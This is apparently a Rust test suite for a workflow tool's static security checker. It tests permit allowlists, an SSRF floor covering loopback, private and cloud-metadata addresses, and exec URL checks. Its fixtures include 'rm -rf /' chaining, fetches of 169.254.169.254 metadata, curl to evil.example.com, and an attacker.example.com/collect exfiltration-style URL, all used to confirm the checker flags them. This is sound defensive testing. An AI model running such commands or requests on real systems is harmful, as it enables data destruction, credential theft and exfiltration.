        // Programs allowlist — a pipeline can launch any program): the
        // check reports the same escape statically (spec 01 §permits
        // rule 8), even when the leading token IS allowlisted. The
        // leading-token heuristic would bless `sleep 5 && rm -rf /`.
        let y = r#"nika: w
permits: { exec: ["sleep"] }
tasks:
  t:
    exec: { shell: "sleep 5" }
"#;
        let e = escapes(y);
        assert_eq!(e.len(), 1, "string form under an allowlist escapes");
        assert!(
            e[0].detail.contains("array form"),
            "the detail routes to the array form: {}",
            e[0].detail
        );
        assert!(
            e[0].fix.is_none(),
            "no machine fix — widening the permit would not make the \
             string form verifiable"
        );
    }
}

#[cfg(test)]
mod floor_parity {
    use super::*;
    use nika_schema::parser::{ParseMode, parse};
    use nika_schema::source::FileId;

    fn escapes(yaml: &str) -> Vec<CapabilityEscape> {
        scan_escapes(&parse(yaml, FileId::new(0), ParseMode::Strict).expect("parse"))
    }

    #[test]
    fn permitted_exact_loopback_literal_declassifies_the_floor() {
        // THE battery-F3 workflow (issue #395 · the local-watch repro):
        // `permits.net.http: ["127.0.0.1"]` + a literal fetch to it. The
        // exact literal is now the author's declassification (ADR-092
        // egress precedent) — check is GREEN and, same-PR, the run
        // reaches the host: the two surfaces agree in the ADMITTING
        // direction, not just the refusing one.
        let y = r#"nika: w
permits:
  net: { http: ["127.0.0.1"] }
  tools: ["nika:fetch"]
tasks:
  probe:
    invoke: { tool: "nika:fetch", args: { url: "http://127.0.0.1:8080/api" } }
"#;
        assert!(
            escapes(y).is_empty(),
            "the exact literal clears entry AND task"
        );
        // Every qualifying spelling declassifies — `localhost` and the
        // v6 loopback in both its bare and URL-authority forms.
        for (entry, url) in [
            ("localhost", "http://localhost:3000/x"),
            ("::1", "https://[::1]:8080/x"),
            ("[::1]", "https://[::1]/x"),
        ] {
            let y = format!(
                "nika: w\npermits: {{ net: {{ http: [\"{entry}\"] }}, \
                 tools: [\"nika:fetch\"], exec: false }}\ntasks:\n  t:\n    \
                 invoke: {{ tool: \"nika:fetch\", args: {{ url: \"{url}\" }} }}\n"
            );
            assert!(
                escapes(&y).is_empty(),
                "`{entry}` must clear {url}: {:?}",
                escapes(&y)
            );
        }
    }

    #[test]
    fn declassification_is_exact_never_cross_host() {
        // `localhost` permitted · `127.0.0.1` fetched: the declassification
        // is the literal in the file, NEVER what it resolves to — the task
        // floor escape stays (and the entry, being live for ITS host, is
        // not dead-flagged).
        let y = r#"nika: w
permits:
  net: { http: ["localhost"] }
  tools: ["nika:fetch"]
tasks:
  probe:
    invoke: { tool: "nika:fetch", args: { url: "http://127.0.0.1:8080/api" } }
"#;
        let e = escapes(y);
        assert_eq!(e.len(), 1, "the task floors, the entry is live: {e:?}");
        assert_eq!(e[0].task, "probe");
        assert!(e[0].floor && e[0].fix.is_none());
    }

    #[test]
    fn never_list_grants_stay_dead_and_their_fetches_stay_floored() {
        // RFC1918 · metadata name · link-local: naming them in permits
        // declassifies NOTHING — the entry is still a dead grant and the
        // fetch still floors (2 escapes each, the pre-#395 shape).
        for (entry, url) in [
            ("10.0.0.5", "http://10.0.0.5/x"),
            ("192.168.1.1", "http://192.168.1.1/admin"),
            (
                "169.254.169.254",
                "http://169.254.169.254/latest/meta-data/",
            ),
            (
                "metadata.google.internal",
                "http://metadata.google.internal/x",
            ),
            ("fe80::1", "http://[fe80::1]/x"),
            ("api.localhost", "http://api.localhost/x"),
        ] {
            let y = format!(
                "nika: w\npermits: {{ net: {{ http: [\"{entry}\"] }}, \
                 tools: [\"nika:fetch\"], exec: false }}\ntasks:\n  t:\n    \
                 invoke: {{ tool: \"nika:fetch\", args: {{ url: \"{url}\" }} }}\n"
            );
            let e = escapes(&y);
            assert_eq!(e.len(), 2, "`{entry}`: dead entry + floored task: {e:?}");
            assert!(e.iter().all(|esc| esc.floor && esc.fix.is_none()));
        }
    }

    #[test]
    fn floor_fires_without_any_permits_block() {
        // The floor is permits-INDEPENDENT — it fires with no boundary
        // declared too. F-O8 companion: the tool ALSO escapes the zero
        // boundary (absent = zero authority · NIKA-AUTH-006).
        let y = r#"nika: w
tasks:
  t:
    invoke: { tool: "nika:fetch", args: { url: "http://localhost:3000/x" } }
"#;
        let e = escapes(y);
        assert_eq!(e.len(), 2, "floor + the F-O8 zero-boundary escape: {e:?}");
        assert!(e[0].floor);
        assert!(e[0].detail.contains("`localhost`"), "{}", e[0].detail);
        assert!(e[1].undeclared && !e[1].floor, "the AUTH-006 companion");
        // …and a public fetch with no permits now escapes the zero
        // boundary (F-O8): exactly one undeclared escape.
        let clean = r#"nika: w
tasks:
  t:
    invoke: { tool: "nika:fetch", args: { url: "https://api.example.com/x" } }
"#;
        let e = escapes(clean);
        assert_eq!(e.len(), 1, "absent = zero authority: {e:?}");
        assert!(e[0].undeclared);
    }

    #[test]
    fn metadata_ip_gets_the_floor_teaching_not_a_grant_fix() {
        // Outside permits AND floor-blocked: the old path would have said
        // « add "169.254.169.254" to permits.net.http » — a lie (the grant
        // cannot help). The floor escape must be the ONLY finding.
        let y = r#"nika: w
permits:
  net: { http: ["api.x.com"] }
  tools: ["nika:fetch"]
tasks:
  t:
    invoke: { tool: "nika:fetch", args: { url: "http://169.254.169.254/latest/meta-data/" } }
"#;
        let e = escapes(y);
        assert_eq!(e.len(), 1, "{e:?}");
        assert!(e[0].floor);
        assert!(e[0].fix.is_none(), "a grant fix here would be a lie");
    }

    #[test]
    fn dead_grant_is_flagged_even_when_unused() {
        // Entry-level truth: an RFC1918 grant is inert whether or not a
        // static URL exercises it (a dynamic URL to it still floors at
        // run) — while the loopback literal beside it is LIVE (#395·the
        // declassification) and must not be dead-flagged.
        let y = r#"nika: w
permits:
  net: { http: ["10.0.0.5", "localhost", "api.x.com"] }
  tools: ["nika:fetch"]
tasks:
  t:
    invoke: { tool: "nika:fetch", args: { url: "https://api.x.com/x" } }
"#;
        let e = escapes(y);
        assert_eq!(e.len(), 1, "{e:?}");
        assert_eq!(e[0].task, "permits");
        assert!(e[0].floor);
        assert!(e[0].detail.contains("`10.0.0.5`"), "{}", e[0].detail);
    }

    #[test]
    fn glob_entries_and_public_hosts_stay_silent() {
        // A glob may match public names — glob-vs-floor inclusion is DNS
        // knowledge the static pass does not have. Never flagged HERE:
        // the FLOOR scan stays silent on globs (F-P5's wildcard refusal
        // is the permit_taint lane's · NIKA-AUTH-010 · a separate finding,
        // never a floor classification).
        let y = r#"nika: w
permits:
  net: { http: ["*.internal.example", "*.localhost"] }
  tools: ["nika:fetch"]
tasks:
  t:
    invoke: { tool: "nika:fetch", args: { url: "https://api.internal.example/x" } }
"#;
        assert!(escapes(y).is_empty(), "globs are never floor-classified");
    }

    #[test]
    fn webhook_notify_to_private_target_floors() {
        // The floor speaks for every Net-classified builtin — webhook
        // notify rides the same nika-http boundary as fetch. F-O8: the
        // tool escape (zero boundary · no permits:) rides alongside.
        let y = r#"nika: w
tasks:
  t:
    invoke: { tool: "nika:notify", args: { channel: "webhook", target: "http://10.0.0.8/hook", message: "hi" } }
"#;
        let e = escapes(y);
        assert_eq!(e.len(), 2, "floor + the F-O8 companion: {e:?}");
        assert!(e[0].floor);
        assert!(e[0].detail.contains("`10.0.0.8`"), "{}", e[0].detail);
        assert!(e[1].undeclared, "the AUTH-006 companion");
    }

    #[test]
    fn localhost_family_and_dynamic_urls_split_static_vs_runtime() {
        // `api.localhost` is loopback BY STRUCTURE (RFC 6761) → static.
        // F-O8: the floor finding AND the zero-boundary tool escape ride
        // together (no `permits:` block declared).
        let family = r#"nika: w
tasks:
  t:
    invoke: { tool: "nika:fetch", args: { url: "http://api.localhost/x" } }
"#;
        let e = escapes(family);
        assert_eq!(
            e.len(),
            2,
            "the localhost FAMILY floors + the tool escapes the zero boundary: {e:?}"
        );
        assert!(e.iter().any(|x| x.floor), "the floor finding rides");
        assert!(
            e.iter().any(|x| x.undeclared),
            "the F-O8 zero-boundary finding rides"
        );
        // A GENUINELY dynamic URL is invisible statically — under an absent
        // block the check stays silent (NEP-0003 law 3): the runtime
        // refusal (NIKA-SEC-004) owns the resource, and the floor never saw
        // a host. `inputs.` is the law's own case: NEP-0003's conformance
        // fixture `runtime/permits/003-absent-permits-runtime-refusal`
        // templates the host `${{ inputs.url }}` verbatim, and a run
        // supplies any value it likes with `--var`.
        let dynamic = r#"nika: w
inputs:
  target:
    type: string
    default: "http://127.0.0.1/x"
tasks:
  t:
    invoke: { tool: "nika:fetch", args: { url: "${{ inputs.target }}" } }
"#;
        let e = escapes(dynamic);
        // The RESOURCE defers · the TOOL AUTHORITY does not. This used to
        // assert nothing fires at all, which conflated two conjuncts: the
        // host is genuinely unknowable here (law 3), but `permits.tools`
        // under an absent block grants nothing, so the invoke cannot run
        // whatever the url turns out to be. Measured on this exact shape,
        // check and run now return the SAME code:
        //   check NIKA-AUTH-006 · tools     run NIKA-AUTH-006
        assert_eq!(
            e.len(),
            1,
            "the tool conjunct survives a dynamic url: {e:?}"
        );
        assert_eq!(
            e[0].category, "tools",
            "and it is the TOOL, not the host: {e:?}"
        );
        assert!(
            !e.iter().any(|x| x.floor),
            "the floor never saw a host, so it cannot fire (NEP-0003 law 3): {e:?}"
        );
        // A `const.`-backed URL is NOT dynamic and is judged. This half of
        // the test used to assert silence with `const:` in the same slot,
        // calling it "dynamic" — the law never said that (its fixture uses
        // `inputs.`), and it is not true: measured 2026-07-28, `nika run
        // <file> --var target=X` on a file whose `target` is a const
        // answers ``--var target: this workflow declares no `inputs:` ``.
        // `--var` reaches `inputs:` only, so a const cannot move between
        // check and run.
        //
        // Reading it as dynamic was a live security hole (F8): TRIFECTA
        // takes its private-read leg off `permits:`, so deleting a grant
        // deleted the leg while the effect stayed in the body — and with a
        // const-backed path nothing else caught it. Two files one
        // `permits:` line apart, byte-identical `tasks:`: the honest one
        // was refused NIKA-SEC-009, the under-declared one passed
        // `--native-strict` with 0 hints and then died at run on its first
        // task. The gate blocked what worked and passed what could not run.
        //
        // THE AUTHORITY IS THE BOUNDARY, and this assertion pins it:
        // `const.` resolves, `inputs.`/`config.` do not.
        let constant = r#"nika: w
const: { target: "http://127.0.0.1/x" }
tasks:
  t:
    invoke: { tool: "nika:fetch", args: { url: "${{ const.target }}" } }
"#;
        let e = escapes(constant);
        assert!(
            e.iter().any(|x| x.floor),
            "a const-backed loopback target floors at CHECK time, not at run: {e:?}"
        );
    }

    /// An empty `net.http` is a CERTAIN run failure · a non-empty one is not.
    ///
    /// F13. A `nika:notify` whose target rides a secret has a host no static
    /// pass can learn, and the whole question looked closed on that ground.
    /// It is two questions:
    ///
    ///   which host?        undecidable · the secret carries it
    ///   is there ANY host? decidable · set emptiness
    ///
    /// Seven shipped showcase files were green at check and refused at run
    /// with `NIKA-SEC-004` for exactly this. The third arm below is the one
    /// that must STAY silent: with a non-empty allowlist the checker does not
    /// know whether the runtime host is in it, and a finding there would be
    /// the false refusal this checker must not make either. So the test pins
    /// both directions, because a fix that also fired on arm three would look
    /// like an improvement and be a regression.
    #[test]
    fn an_empty_net_allowlist_is_decidable_a_populated_one_is_not() {
        let wf = |net: &str| {
            format!(
                r#"nika: n
secrets:
  hook:
    source: env
    key: H
    egress:
      - to: "nika:notify"
        host_from_self: true
permits:
  tools: ["nika:notify"]
{net}tasks:
  send:
    invoke:
      tool: "nika:notify"
      args: {{ channel: webhook, target: "${{{{ secrets.hook }}}}", message: "x" }}
"#
            )
        };
        for (label, net) in [("absent", ""), ("empty", "  net:\n    http: []\n")] {
            let e = escapes(&wf(&net.replace("\\n", "\n")));
            assert!(
                e.iter().any(|x| x.category == "net"),
                "net.http {label} grants no host, so the run cannot succeed: {e:?}"
            );
        }
        let populated = escapes(&wf("  net:\n    http: [\"api.shop.example.com\"]\n"
            .replace("\\n", "\n")
            .as_str()));
        assert!(
            !populated.iter().any(|x| x.category == "net"),
            "a populated allowlist is NOT decidable from here — the secret's host \
             may or may not be in it, and a finding would be a false refusal: {populated:?}"
        );
    }

    /// The under-declaration inversion, pinned (F8 · 2026-07-28).
    ///
    /// Same body, one `permits:` line apart. Before the const table, the
    /// under-declared file passed clean; the runtime then refused it on its
    /// first task. A boundary verdict must not depend on which authority
    /// the author routed the path through.
    #[test]
    fn a_const_backed_path_cannot_dodge_the_declared_boundary() {
        let body = |grant: &str| {
            format!(
                r#"nika: w
const: {{ pin: "./data/pin.toml" }}
permits:
  fs:
{grant}    write: ["./target/**"]
  tools: ["nika:read"]
tasks:
  t:
    invoke: {{ tool: "nika:read", args: {{ path: "${{{{ const.pin }}}}" }} }}
"#
            )
        };
        let granted = escapes(&body("    read: [\"./data/**\"]\n"));
        assert!(
            granted.is_empty(),
            "the declared boundary admits the const-backed path: {granted:?}"
        );
        let withheld = escapes(&body(""));
        assert!(
            withheld.iter().any(|e| e.category == "fs"),
            "deleting the grant must NOT hide the read: {withheld:?}"
        );
        // The repair names the resolved path, not the expression — an agent
        // repair loop pattern-matches the one `add "<entry>" to permits.<p>`
        // idiom, and `${{ const.pin }}` is not an entry.
        assert!(
            withheld
                .iter()
                .any(|e| e.fix.as_deref() == Some(r#"add "./data/pin.toml" to permits.fs.read"#)),
            "the fix carries the resolved path: {withheld:?}"
        );
    }
    /// The exec net-fit (the 2026-07-29 audit · run 5 · D1): an argv
    /// carrying a LITERAL URL judges the host exactly like an invoke's —
    /// outside the boundary it is an escape, inside it is clean, the
    /// shell line is scanned the same, and a floor-blocked host is never
    /// double-reported.
    fn exec_net(yaml: &str) -> Vec<CapabilityEscape> {
        use nika_schema::parser::{ParseMode, parse};
        use nika_schema::source::FileId;
        scan_escapes(&parse(yaml, FileId::new(0), ParseMode::Strict).expect("parse"))
    }

    #[test]
    fn an_exec_url_judges_its_host_like_an_invoke() {
        let yaml = |net: &str| {
            format!(
                "nika: t\npermits:\n  exec: [\"curl\"]\n  net:\n    http: [{net}]\ntasks:\n  t:\n    exec: {{ command: [\"curl\", \"https://evil.example.com/x\"] }}\n"
            )
        };
        let granted = exec_net(&yaml(r#""evil.example.com""#));
        assert!(
            !granted.iter().any(|e| e.category == "net"),
            "the declared host admits the exec URL: {granted:?}"
        );
        let withheld = exec_net(&yaml(r#""other.example.com""#));
        assert!(
            withheld.iter().any(|e| e.category == "net"
                && e.detail.contains("evil.example.com")
                && e.fix.as_deref() == Some(r#"add "evil.example.com" to permits.net.http"#)),
            "the exec URL outside the boundary escapes with the fix: {withheld:?}"
        );
        // The shell form is scanned the same way where the form itself is
        // admissible (`exec: true` — under a program allowlist the pairing
        // is already refused by form, SEC-004, and the net question is moot).
        let shell = exec_net(
            "nika: t\npermits:\n  exec: true\ntasks:\n  t:\n    exec: { shell: \"curl https://evil.example.com/x\" }\n",
        );
        assert!(
            shell
                .iter()
                .any(|e| e.category == "net" && e.detail.contains("evil.example.com")),
            "the shell-string URL is judged too: {shell:?}"
        );
        // A floor-blocked host stays the SSRF floor's own (one voice): the
        // floor may name the dead `permits` entry, but the exec net-fit
        // must never ALSO report the same host from the task side.
        let floor = exec_net(
            "nika: t\npermits:\n  exec: [\"curl\"]\n  net:\n    http: [\"10.0.0.8\"]\ntasks:\n  t:\n    exec: { command: [\"curl\", \"https://10.0.0.8/x\"] }\n",
        );
        assert!(
            !floor
                .iter()
                .any(|e| e.task == "t" && e.detail.contains("10.0.0.8")),
            "the exec net-fit never double-reports a floor-dead host: {floor:?}"
        );
    }
}

/// #1393 — a literal authority closed by a delimiter names its host
/// whatever the query carries; an authority the template can still reach
/// stays derived, because `@evil.example/` in the value would move the host.
#[test]
fn templated_url_host_names_a_closed_literal_authority_only() {
    use super::templated_url_host as host;
    assert_eq!(
        host("https://attacker.example.com/collect?k=${{ with.k }}").as_deref(),
        Some("attacker.example.com")
    );
    assert_eq!(
        host("https://h.example/?q=${{ x }}").as_deref(),
        Some("h.example")
    );
    assert_eq!(
        host("https://h.example/#${{ x }}").as_deref(),
        Some("h.example")
    );
    assert_eq!(
        host("https://api.${{ x }}.com/v1").as_deref(),
        None,
        "partial authority"
    );
    assert_eq!(
        host("https://h.example${{ p }}").as_deref(),
        None,
        "open authority"
    );
    assert_eq!(
        host("https://h.example:${{ port }}/").as_deref(),
        None,
        "open port"
    );
    assert_eq!(
        host("https://${{ with.host }}/x").as_deref(),
        None,
        "derived host"
    );
    assert_eq!(
        host("https://h.example/plain").as_deref(),
        None,
        "no island: not this door"
    );
}
